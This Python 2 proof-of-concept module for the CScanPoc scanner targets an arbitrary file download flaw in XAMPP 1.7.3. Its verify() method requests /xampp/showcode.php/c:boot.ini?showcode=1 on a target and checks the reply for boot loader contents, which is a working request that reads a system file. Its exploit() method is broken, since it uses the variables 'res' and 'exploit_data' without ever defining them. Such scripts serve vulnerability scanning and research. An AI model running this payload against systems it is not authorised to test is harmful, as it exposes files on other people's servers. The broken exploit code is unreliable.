# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'xampp_0000' # 平台漏洞编号，留空
    name = 'xampp 1.7.3 /xampp/showcode.php 任意文件下载漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2010-11-01'  # 漏洞公布时间
    desc = '''
        xampp 1.7.3 /xampp/showcode.php 任意文件下载漏洞
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/15370/' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'xamp'  # 漏洞应用名称
    product_version = '1.7.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1d5ef762-f565-4330-bf1f-527e67a35bee'
    author = '国光'  # POC编写者
    create_date = '2018-05-09' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(target=self.target)+'/xampp/showcode.php/c:boot.ini?showcode=1'
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if "<textarea cols='100' rows='10'>[boot loader]" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))


            if res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的为{data}'.format(target=self.target,name=self.vuln.name,data=exploit_data))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()